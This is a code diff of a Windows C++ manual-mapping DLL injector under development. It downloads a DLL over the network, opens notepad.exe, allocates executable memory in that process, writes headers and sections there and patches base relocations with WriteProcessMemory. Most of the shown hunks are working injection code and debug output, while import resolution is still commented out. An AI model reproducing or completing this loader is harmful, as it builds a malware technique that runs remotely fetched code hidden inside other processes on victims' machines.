@@ -4,6 +4,8 @@
 #include <vector>
 #include <tlhelp32.h>
 
+#define DEBUG 1
+
 LPCSTR dllPath_n = "network_lib.dll";
 
 typedef int (*SendDataFunc)(const std::string&, const std::string&);
@@ -94,27 +96,28 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
     
     for(int i=0;i<50;i++)std::cout << "="; std::cout << "\n\n";
 
-    std::cout << " Size of the Image           : " << imageSize << std::endl;
+    std::cout << " Size of the Image           : 0x" << std::hex << imageSize << std::endl;
     std::cout << " Image Base                  : 0x" << std::hex << ntHeaders->OptionalHeader.ImageBase << std::dec << std::endl;
-    std::cout << " Entry Point                 : 0x" << std::hex << ntHeaders->OptionalHeader.AddressOfEntryPoint << std::dec << std::endl;
+    //std::cout << " Entry Point                 : 0x" << std::hex << ntHeaders->OptionalHeader.AddressOfEntryPoint << std::dec << std::endl;
     std::cout << " Number of Sections          : " << ntHeaders->FileHeader.NumberOfSections << std::endl;
-    std::cout << " Size of Headers             : " << ntHeaders->OptionalHeader.SizeOfHeaders << std::endl;
-    std::cout << " Checksum                    : 0x" << std::hex << ntHeaders->OptionalHeader.CheckSum << std::dec << std::endl;
-    std::cout << " Subsystem                   : " << ntHeaders->OptionalHeader.Subsystem << std::endl;
-    std::cout << " DLL Characteristics         : 0x" << std::hex << ntHeaders->OptionalHeader.DllCharacteristics << std::dec << std::endl;
-    std::cout << " Size of Stack Reserve       : " << ntHeaders->OptionalHeader.SizeOfStackReserve << std::endl;
-    std::cout << " Size of Stack Commit        : " << ntHeaders->OptionalHeader.SizeOfStackCommit << std::endl;
-    std::cout << " Size of Heap Reserve        : " << ntHeaders->OptionalHeader.SizeOfHeapReserve << std::endl;
-    std::cout << " Size of Heap Commit         : " << ntHeaders->OptionalHeader.SizeOfHeapCommit << std::endl;
-    std::cout << " Loader Flags                : 0x" << std::hex << ntHeaders->OptionalHeader.LoaderFlags << std::dec << std::endl;
-    std::cout << " Number of Rva and Sizes     : " << ntHeaders->OptionalHeader.NumberOfRvaAndSizes << std::endl;
+    std::cout << " Size of Headers             : 0x" << std::hex << ntHeaders->OptionalHeader.SizeOfHeaders << std::endl;
+    std::cout << " Base of Code                : 0x" << std::hex << ntHeaders->OptionalHeader.BaseOfCode << std::dec << std::endl;
+    //std::cout << " Checksum                    : 0x" << std::hex << ntHeaders->OptionalHeader.CheckSum << std::dec << std::endl;
+    //std::cout << " Subsystem                   : " << ntHeaders->OptionalHeader.Subsystem << std::endl;
+    //std::cout << " DLL Characteristics         : 0x" << std::hex << ntHeaders->OptionalHeader.DllCharacteristics << std::dec << std::endl;
+    //std::cout << " Size of Stack Reserve       : " << ntHeaders->OptionalHeader.SizeOfStackReserve << std::endl;
+    //std::cout << " Size of Stack Commit        : " << ntHeaders->OptionalHeader.SizeOfStackCommit << std::endl;
+    //std::cout << " Size of Heap Reserve        : " << ntHeaders->OptionalHeader.SizeOfHeapReserve << std::endl;
+    //std::cout << " Size of Heap Commit         : " << ntHeaders->OptionalHeader.SizeOfHeapCommit << std::endl;
+    //std::cout << " Loader Flags                : 0x" << std::hex << ntHeaders->OptionalHeader.LoaderFlags << std::dec << std::endl;
+    //std::cout << " Number of Rva and Sizes     : " << ntHeaders->OptionalHeader.NumberOfRvaAndSizes << std::endl;
     
     std::cout << std::endl; for(int i=0;i<50;i++)std::cout << "="; std::cout << "\n\n";
 
 //======================================================================================================================================================================
 
 // Allocate memory for full DLL image
-    std::cout << "-> Trying to allocate prefered spot ";
+    std::cout << "-> Trying to allocate at 0x" << std::hex << ntHeaders->OptionalHeader.ImageBase;
     void* remoteMem = VirtualAllocEx(hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMem)
     {
@@ -134,8 +137,18 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
     {
         std::cerr << "Failed to write headers: " << GetLastError() << std::endl;
         return false;
-    }   std::cout << "\t[wrote headers]\n" << std::endl;
+    }   
+    std::cout << "\t[wrote headers]\n" << std::endl;
 
+    #if DEBUG
+        for(int i=0;i<15;i++)std::cout << "=";std::cout << "DEBUGGING";for(int i=0;i<15;i++)std::cout << "=";std::cout << std::endl;
+        
+        std::cout << "Size of headers: 0x" << std::hex << ntHeaders->OptionalHeader.SizeOfHeaders << " bytes" << std::endl;      
+        std::cout << "First address used by headers: 0x" << std::hex << (uintptr_t(remoteMem)) << std::dec << std::endl;
+        std::cout << "Last address used by headers: 0x" << std::hex << (uintptr_t(remoteMem) + ntHeaders->OptionalHeader.SizeOfHeaders - 1) << std::endl;
+
+        for(int i=0;i<15;i++)std::cout << "=";std::cout << "DEBUGGING";for(int i=0;i<15;i++)std::cout << "=";std::cout << std::endl << std::endl;
+    #endif
 //======================================================================================================================================================================
 
     // Write sections
@@ -145,6 +158,10 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
         void* sectionDest = (BYTE*)remoteMem + sectionHeader[i].VirtualAddress;
         void* sectionSrc = localDLL + sectionHeader[i].PointerToRawData;
 
+        // std::cout << "Section Size: 0x" << std::hex << sectionHeader[i].SizeOfRawData << std::dec << " bytes" << std::endl;
+        // std::cout << "Section Dest: 0x" << std::hex << sectionDest << std::dec << std::endl;
+        // std::cout << "Section Src: 0x" << std::hex << sectionSrc << std::dec << std::endl;
+
         if (!WriteProcessMemory(hProcess, sectionDest, sectionSrc, sectionHeader[i].SizeOfRawData, nullptr))
         {
             std::cerr << "Failed to write section " << sectionHeader[i].Name << ": " << GetLastError() << std::endl;
@@ -153,40 +170,115 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
         std::cout << "-> Allocated Section : " << sectionHeader[i].Name << std::endl;
     }   std::cout << "\t[Allocation Done]\n" << std::endl;
 
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
+    {
+
+
+    }
+
 //======================================================================================================================================================================
 
-    // Resolve relocations if the base address has changed
-    // if ((LPVOID)ntHeaders->OptionalHeader.ImageBase != remoteMem)
-    // {
-    //     std::cout << "Base Change -> \nExpected: 0x"<< std::hex << ntHeaders->OptionalHeader.ImageBase << " Actual: 0x"<< std::hex << remoteMem << std::endl; 
+    try
+    {
+        // Resolve relocations if the base address has changed
+        if ((LPVOID)ntHeaders->OptionalHeader.ImageBase != remoteMem)
+        {
+            std::cout << "Base Change -> \nExpected: 0x" << std::hex << ntHeaders->OptionalHeader.ImageBase << " Actual: 0x" << std::hex << remoteMem << std::endl; 
 
-    //     IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-    //     if (relocDir.Size)
-    //     {
-    //         IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(localDLL + relocDir.VirtualAddress);
-    //         std::cout << reloc;
-    //         SIZE_T delta = (SIZE_T)remoteMem - ntHeaders->OptionalHeader.ImageBase;
+            IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+            if (relocDir.Size)
+            {
+                IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(localDLL + relocDir.VirtualAddress);
+                SIZE_T delta = (SIZE_T)remoteMem - ntHeaders->OptionalHeader.ImageBase;
+                std::cout << "Delta: 0x" << std::hex << delta << std::endl; 
 
-    //         while (reloc->VirtualAddress)
-    //         {
-    //             int numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-    //             WORD* entry = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
+                            std::cout << std::endl; for(int i=0;i<15;i++)std::cout << "=";std::cout << "DEBUGGING";for(int i=0;i<15;i++)std::cout << "=";std::cout << std::endl;
+                            //std::cout << "Reloc table size: " << ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size << std::endl;
 
-    //             for (int i = 0; i < numEntries; i++)
-    //             {
-    //                 if (entry[i] >> 12 == IMAGE_REL_BASED_HIGHLOW)
-    //                 {
-    //                     DWORD* patchAddr = (DWORD*)((BYTE*)remoteMem + reloc->VirtualAddress + (entry[i] & 0xFFF));
-    //                     DWORD oldValue;
-    //                     ReadProcessMemory(hProcess, patchAddr, &oldValue, sizeof(DWORD), nullptr);
-    //                     DWORD newValue = oldValue + delta;
-    //                     WriteProcessMemory(hProcess, patchAddr, &newValue, sizeof(DWORD), nullptr);
-    //                 }
-    //             }
-    //             reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
-    //         }
-    //     }
-    // }
+                            //std::cout << "Reloc table VA: 0x" << std::hex << reloc << std::endl;
+                            //std::cout << "RelocDir VirtualAddress: 0x" << std::hex << relocDir.VirtualAddress << std::endl;
+                            //std::cout << "RelocDir Size: 0x" << std::hex << relocDir.Size << std::endl;
+                            //std::cout << "Downloaded DLL size: " << downloaded_dll->size() << std::endl;
+
+                            if (relocDir.VirtualAddress + relocDir.Size > downloaded_dll->size()) std::cerr << "Relocation directory is out of bounds!" << std::endl;
+
+                            //std::cout << "Expected Headers Address: 0x" << std::hex << ntHeaders->OptionalHeader.ImageBase << std::endl;
+                            //std::cout << "Actual Headers Address: 0x" << std::hex << remoteMem << std::endl;
+
+                            for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
+                            {
+                                std::cout << "Section " << sectionHeader[i].Name << " Expected Address: 0x" << std::hex << (ntHeaders->OptionalHeader.ImageBase + sectionHeader[i].VirtualAddress) << std::endl;
+                                //std::cout << "Section " << sectionHeader[i].Name << " Actual Address: 0x" << std::hex << ((BYTE*)remoteMem + sectionHeader[i].VirtualAddress) << std::endl;
+                            }
+
+                            for(int i=0;i<15;i++)std::cout << "=";std::cout << "DEBUGGING";for(int i=0;i<15;i++)std::cout << "=";std::cout << std::endl << std::endl;
+
+                // //while (reloc->VirtualAddress)
+                // for(int i=0;i<4;i++)                                            //print reloc entries
+                // {std::cout << "############################";
+                //     std::cout << "SizeOfBlock: " << reloc->SizeOfBlock;
+                //     std::cout << "VirtualAddress: 0x" << std::hex << reloc->VirtualAddress;
+                    
+                //     if (reloc->VirtualAddress && reloc->SizeOfBlock)
+                //     {
+                //         std::cout << "\nReloc Block at VA: 0x" << std::hex << reloc->VirtualAddress << " Size: " << reloc->SizeOfBlock << std::endl;
+                //     }
+                //     else
+                //     {
+                //         std::cout << "Invalid meory";
+                //         break;
+                //     }
+                //     std::cout << "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!";
+                //     int numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                //     WORD* entry = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
+                // std::cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+                //     for (int i = 0; i < numEntries; i++)
+                //     {
+                //         DWORD offset = entry[i] & 0xFFF;
+                //         DWORD type = entry[i] >> 12;
+                //         std::cout << "Entry " << i << ": Type: " << type << " Offset: 0x" << std::hex << offset << std::endl;
+
+                // //         if (type == IMAGE_REL_BASED_HIGHLOW)
+                // //         {
+                // //             DWORD* patchAddr = (DWORD*)((BYTE*)remoteMem + reloc->VirtualAddress + offset);
+                // //             DWORD oldValue;
+                // //             ReadProcessMemory(hProcess, patchAddr, &oldValue, sizeof(DWORD), nullptr);
+                // //             DWORD newValue = oldValue + delta;
+                // //             WriteProcessMemory(hProcess, patchAddr, &newValue, sizeof(DWORD), nullptr);
+                // //         }
+                //     }
+                //     reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
+                // }
+            
+                while (reloc->VirtualAddress)
+                {
+
+                    int numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                    std::cout << "No of Entries in reloc = " << numEntries <<std::endl;
+                    WORD* entry = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
+
+                    for (int i = 0; i < numEntries; i++)
+                    {
+                        if (entry[i] >> 12 == IMAGE_REL_BASED_HIGHLOW)
+                        {
+                            DWORD* patchAddr = (DWORD*)((BYTE*)remoteMem + reloc->VirtualAddress + (entry[i] & 0xFFF));
+                            DWORD oldValue;
+                            ReadProcessMemory(hProcess, patchAddr, &oldValue, sizeof(DWORD), nullptr);
+                            DWORD newValue = oldValue + delta;
+                            WriteProcessMemory(hProcess, patchAddr, &newValue, sizeof(DWORD), nullptr);
+                        }
+                    }
+                    reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
+                }
+            }
+        }
+    }
+    catch(const std::exception& e)
+    {
+        std::cerr << e.what() << '\n';
+    }
+    
+
 
     // // Resolve imports
     // IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
@@ -262,6 +354,7 @@ int main()
     load_dll();
  
     std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
+    //std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");
 
     std::cout << "Trying to get a handle to the process...\n"; 
     DWORD processID = GetProcessID(L"notepad.exe");
